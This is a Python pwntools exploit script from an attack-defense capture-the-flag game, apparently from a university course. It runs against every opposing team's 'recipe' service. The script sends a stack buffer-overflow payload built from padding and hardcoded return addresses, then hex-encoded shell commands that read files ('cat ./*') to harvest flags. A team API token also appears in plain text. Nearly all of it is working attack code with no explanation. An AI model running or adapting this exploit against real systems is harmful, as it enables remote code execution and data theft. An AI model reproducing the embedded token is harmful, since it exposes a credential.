from swpag_client import Team
import pwn

pwn.context.arch = 'amd64'
pwn.context.log_level = 'debug'

t = Team("http://actf4_team.cse545.io/", "A17sryrF7bFDVR6D4niP")

for team in t.get_targets(1):
    host=team['hostname']
    recipe_id=team['flag_id']
    p=pwn.remote(host,'10001')
    try:
        p.recvuntil('Print Recipe')
        #p.recvline() #"Your choice (1-3): "
        #p.clean()
        p.sendline('A')
        p.recvuntil('recipe-text')
        p.sendline('\x0a')
        stol=b'\x31\x20\x31\x32\x33\x20\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x43\x6a\x50\x57\x41\x41\x41\x41\x41\x41\x41\x41\xeb\x18\x40\x00\x00\x00\x00\x00\x43\x1c\x40\x00\x00\x00\x00\x00\x1a\x9e\xc4\xb9\x56\x7f\x00\x00\x50\x55\xae\xb9\x56\x7f\x00\x00\x0a'
        p.sendline(stol)
        stol1=b'\x65\x63\x68\x6f\x20\x68\x65\x6c\x6c\x6f\x0a'
        p.sendline(stol1)
        '''
        stol1="6563686f2068656c6c6f0a"
        base16INT = int(stol1, 16)
        hex_value = hex(base16INT)
        p.sendline(hex_value)
        '''
        #p.interactive()
        p.recvuntil('saved!')
        p.recvuntil('hello')
        stol2=b'\x63\x61\x74\x20\x2e\x2f\x2a\x20\x26\x26\x20\x65\x63\x68\x6f\x20\x64\x6f\x6e\x65\x0a'
        p.sendline(stol2)

        while True:
            p.recvuntil('FLG')
            fflag=p.recv(13)
            fflag="FLG" + fflag
            #flag.append(fflag)
            print(fflag)
            t.submit_flag([fflag])
    except EOFError as error:
        continue